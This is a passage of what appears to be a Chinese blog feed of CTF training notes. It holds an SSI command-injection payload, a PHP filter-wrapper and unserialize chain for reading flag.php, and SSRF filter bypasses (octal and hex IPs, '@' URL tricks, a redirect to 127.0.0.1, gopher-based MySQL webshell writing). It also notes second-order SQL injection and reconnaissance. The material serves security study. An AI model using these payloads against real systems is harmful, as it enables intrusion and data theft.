class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>password的MD5前6为要为6d0bc1，并且在public下创建一个shtml文件，将post传参的username写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-built_in">str</span>(x).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> md5(i).startswith(<span class="hljs-string">&#x27;6d0bc1&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>**********************************************************<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    a = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>**********************************************************<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-built_in">str</span>(x).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> md5(i)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>得到2020666、2305004、9162671</p><p>登录后页面无信息，抓包发现相应包</p><blockquote><p>Url_Is_Here: public/6603ba4be4783686c502e6ed76359c091abe138d.shtml</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211230125824492.png"></p><p>注意到是shtml文件，ssi注入</p><blockquote><!--exec cmd="ls ../"></blockquote><p>在用户名处注入后，访问shtml即可</p><p>SSI注入：<a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SHTML%E6%96%87%E4%BB%B6">https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SHTML%E6%96%87%E4%BB%B6</a></p><p><a href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection">https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection</a></p><h2 id="浙江大学生信安决赛2019-逆转思维"><a href="#浙江大学生信安决赛2019-逆转思维" class="headerlink" title="浙江大学生信安决赛2019-逆转思维"></a>浙江大学生信安决赛2019-逆转思维</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = unserialize(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</p></blockquote><p>解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;HAHAHAHAHA&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>包含useless.php</p><blockquote><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php</p></blockquote><p>传入password序列化字符串</p><blockquote><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p>查看源码得到flag</p><h2 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h2><p><a href="http://www.tar.gz获得源码/">www.tar.gz获得源码</a></p><p>基本都包含了common.inc.php，在其中对用户输入进行了addslashes转义</p><p>文件上传中发现，对文件名和文件路径等信息在pathinfo函数分割，白名单校验；然后通过数据库插叙文件名和对应后缀是否存在，以此判断文件是否已经存在；最后将文件名和后缀存入数据库</p><p>再看重命名功能，首先验证用户是否输入了旧文件名和新文件名，查询数据库，旧文件名存在就update将查询到的存在的文件名更新到存在的文件名更新到数据库oldname字段中，导致文件名$result[‘filename’]再次入库，造成二次注入</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2020/11/20/ssrf/"/>
    <url>/2020/11/20/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>前后端分离的业务下，服务器请求往往会有向本机或其所在内网的其他机器获取数据的过程，如果没有对请求的目标地址做过滤和限制，就会出现SSRF漏洞</p><p>常见的场景如：从指定URL获取资源，篡改该URL地址，指向内网或者外网</p><p>PHP中的函数和伪协议可能造成漏洞的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">file_get_contents()<br>curl_exec()<br>fsockopen()<br><br>    <br>file:<span class="hljs-comment">//</span><br>dict:<span class="hljs-comment">//</span><br>gopher:<span class="hljs-comment">//</span><br>except:<span class="hljs-comment">//</span><br>...<br></code></pre></td></tr></table></figure><h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><p>内网扫描（端口，指纹识别）</p><p>伪协议攻击内网服务（gopher://），枚举敏感文件（file://）</p><h2 id="CTF题"><a href="#CTF题" class="headerlink" title="CTF题"></a>CTF题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>curl_init 初始化 curl 会话</p><p>curl_setopt 设置 curl 传输选项，CURLOPT_HEADER 启用时会将头文件的信息作为数据流输出；CURLOPT_RETURNTRANSFER 为 true 时将 curl_exec()获取的信息以字符串返回，而不是直接输出。</p><p>curl_exec($sh)抓取 URL 并把它传递给浏览器</p><p><a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((strlen(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123; <span class="hljs-comment">//strlen($host)&lt;=3</span><br><span class="hljs-variable">$ch</span>=curl_init(<span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>开始过滤了，方法有：</p><h4 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h4><p>127.0.0.1 使用的是点分十进制 绕过如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8 进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16 进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10 进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><blockquote><p>127.0.1 、127.1、 127。0.0.1 或者转成 2 进制</p><p><a href="http://sudo.cc/">http://sudo.cc/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!filter_var(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211117221246468.png"></p><p>var_filter 会检查不是私有地址，DNS 重绑定没有复现成功</p><p>测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//header(&quot;Location:www.baidu.com&quot;);</span><br>header(<span class="hljs-string">&quot;Location:404 Not Found&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里用到服务器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>header 会发送原生 http 头，一串字符串，上面代码就是用 js 的 Location 属性跳转到 127.0.0.1/flag.php，然后被 header 发回</p><p>预期解：</p><h4 id="DNS-重绑定"><a href="#DNS-重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定</h4><p><a href="http://xip.io/">http://xip.io/</a></p><p><a href="http://ceye.io/">http://ceye.io/</a></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=parse_url(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="URL-bypass"><a href="#URL-bypass" class="headerlink" title="URL bypass"></a>URL bypass</h4><p>尝试夹杂@ # / \ ?，详见<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">blackhat 峰会</a>大佬提到的<code>parse_url</code>解析问题</p><p>需要以<code>http://ctf.</code>开头<code>show</code>结尾</p><blockquote><p>url=<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p></blockquote><h4 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h4><p>mysql 写马</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211117234343142.png"></p><p>将<code>gopher://127.0.0.1:3306/_</code>后面再编码一次，bp 发包，shell 传上</p><p>redis 同理</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集基础篇</title>
    <link href="/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>721第二次培训:<br>信息收集包括主动以及被动</p><p>本次任务有：分别用c 语言和php写 99 乘法表，csdn写博客（另：下星期由我分享win-dos内容）</p><h2 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1.被动信息收集"></a>1.被动信息收集</h2><p>域名信息查询（<a href="https://www.aizhan.com/">爱站网</a> <a href="http://tool.chinaz.com/">站长工具</a>）<br> 企业信息查询（<a href="https://www.qcc.com/">企查查</a> <a href="http://www.beian.gov.cn/portal/recordQuery">公安部备案查询</a>）<br>Github平台：泄露源码、数据库、邮箱、ftp、ssh、端口3389、个人信息、其他敏感信息</p><p>svn信息、邮件信息（通过爬虫、搜索引擎获取暴露的邮箱，邮件信息收集网站<a href="http://www.skymem.info/">1</a> <a href="http://www.hunter.io/">2</a> <a href="http://email-format.com/">3</a>）</p><p>Google Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000430989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>Shodan Hacking<br><img src="https://img-blog.csdnimg.cn/20201120004349809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>钟馗之眼-Zoomeye Hacking<br><img src="https://img-blog.csdnimg.cn/2020112000442964.png#pic_center"><img src="https://img-blog.csdnimg.cn/20201120004448609.png#pic_center"></p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>①直接与目标发生接触（被发现的风险极大）<br>②二层发现 优：扫描快、可靠     缺：不可路由(只能发现本网段的主机)<br>利用的是APR协议，抓包<br>命令有：<img src="https://img-blog.csdnimg.cn/20201120004858371.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004732355.png#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/20201120004205393.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004546683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>③三层发现<br><img src="https://img-blog.csdnimg.cn/20201120004928587.png#pic_center"><img 